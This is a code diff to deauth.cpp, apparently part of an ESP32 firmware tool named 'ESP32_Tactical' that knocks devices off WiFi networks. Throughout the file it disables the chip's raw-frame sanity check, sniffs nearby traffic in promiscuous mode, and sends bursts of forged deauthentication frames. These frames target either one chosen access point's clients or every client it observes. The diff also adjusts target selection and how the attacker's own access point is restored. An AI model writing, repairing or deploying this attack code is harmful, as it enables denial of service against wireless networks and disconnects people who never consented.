@@ -1,10 +1,10 @@
 // deauth.cpp
+
 #include <WiFi.h>
 #include <esp_wifi.h>
 
 // Needed from main.cpp
 extern int pending_ch;
-extern uint8_t target_bssid[6]; // IMPORTED explicitly so the reactive loop actually fires
 
 // ================= CONFIG =================
 #define AP_NAME        "ESP32_Tactical"
@@ -43,6 +43,7 @@ typedef struct {
 
 // ================= GLOBAL STATE =================
 static deauth_pkt_t pkt;
+
 static int attack_mode = DEAUTH_SINGLE;
 static int kicked_count = 0;
 
@@ -60,16 +61,18 @@ inline bool not_broadcast(const uint8_t *mac) {
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
   return 0;
 }
+
 esp_err_t esp_wifi_80211_tx(wifi_interface_t, const void *, int, bool);
 
 // ================= SNIFFER CALLBACK =================
 IRAM_ATTR void packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
+
   if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
-  
+
   const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
   const wifi_frame_t *frame = (wifi_frame_t *)raw->payload;
   const wifi_hdr_t *hdr = &frame->hdr;
-  
+
   if (raw->rx_ctrl.sig_len < sizeof(wifi_hdr_t)) return;
 
   // Keep seq changing a little so frames are not all identical
@@ -77,8 +80,10 @@ IRAM_ATTR void packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (pkt.seq[0] == 0) pkt.seq[1]++;
 
   if (attack_mode == DEAUTH_SINGLE) {
+
     // Only target traffic related to chosen AP
-    if (!same_mac(hdr->dst, pkt.transmitter) && !same_mac(hdr->src, pkt.transmitter)) {
+    if (!same_mac(hdr->dst, pkt.transmitter) &&
+        !same_mac(hdr->src, pkt.transmitter)) {
       return;
     }
 
@@ -91,13 +96,14 @@ IRAM_ATTR void packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (!not_broadcast(pkt.target)) return;
 
     for (int i = 0; i < BURST_COUNT; i++) {
-      // RESTORED: Transmit on WIFI_IF_AP so packets actually send
       esp_wifi_80211_tx(WIFI_IF_AP, &pkt, sizeof(pkt), false);
       delayMicroseconds(250);
     }
+
     kicked_count++;
   }
   else {
+
     bool valid = same_mac(hdr->dst, hdr->bssid) && not_broadcast(hdr->src);
     if (!valid) return;
 
@@ -106,30 +112,46 @@ IRAM_ATTR void packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
     memcpy(pkt.transmitter, hdr->dst, 6);
 
     for (int i = 0; i < BURST_COUNT; i++) {
-      // RESTORED: Transmit on WIFI_IF_AP so packets actually send
       esp_wifi_80211_tx(WIFI_IF_AP, &pkt, sizeof(pkt), false);
       delayMicroseconds(250);
     }
   }
+
+  Serial.printf(
+    "Kick -> %02X:%02X:%02X:%02X:%02X:%02X\n",
+    pkt.target[0], pkt.target[1], pkt.target[2],
+    pkt.target[3], pkt.target[4], pkt.target[5]
+  );
 }
 
 // ================= START ATTACK =================
 void begin_attack(int net_index, int mode, uint16_t reason_code) {
+
   kicked_count = 0;
   attack_mode = mode;
   pkt.reason = reason_code;
 
+  // Keep ESP32 AP alive on the target channel
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP(AP_NAME, AP_PASS, pending_ch);
   esp_wifi_set_channel(pending_ch, WIFI_SECOND_CHAN_NONE);
 
   if (attack_mode == DEAUTH_SINGLE) {
-    // FIXED: Because WiFi.scanDelete() is used in main.cpp, pulling BSSID by index returns garbage here.
-    // We now use the global target_bssid pulled straight from the UI request.
-    memcpy(pkt.ap, target_bssid, 6);
-    memcpy(pkt.transmitter, target_bssid, 6);
+
+    const uint8_t *bssid = WiFi.BSSID(net_index);
+
+    memcpy(pkt.ap, bssid, 6);
+    memcpy(pkt.transmitter, bssid, 6);
+
+    Serial.printf("Single target attack on channel %d\n", pending_ch);
+  }
+  else {
+    Serial.printf("Broadcast attack on channel %d\n", pending_ch);
   }
 
   wifi_promiscuous_filter_t filter = {
-    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
+                   WIFI_PROMIS_FILTER_MASK_DATA
   };
 
   esp_wifi_set_promiscuous(false);
@@ -140,11 +162,31 @@ void begin_attack(int net_index, int mode, uint16_t reason_code) {
 
 // ================= STOP ATTACK =================
 void end_attack() {
+
   Serial.println("Stopping attack...");
-  
-  // Stop sniffing traffic to clear the queue
+
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(nullptr);
-  
-  // RETAINED: Left WiFi.softAPdisconnect OUT to make sure you never drop connection on STOP.
+
+  delay(100);
+
+  // Rebuild AP+STA cleanly on same channel
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect(true, true);
+
+  delay(100);
+
+  WiFi.mode(WIFI_AP_STA);
+
+  delay(200);
+
+  WiFi.softAP(AP_NAME, AP_PASS, pending_ch);
+  esp_wifi_set_channel(pending_ch, WIFI_SECOND_CHAN_NONE);
+
+  delay(300);
+
+  Serial.printf(
+    "ESP32 Tactical AP restored on channel %d\n",
+    pending_ch
+  );
 }
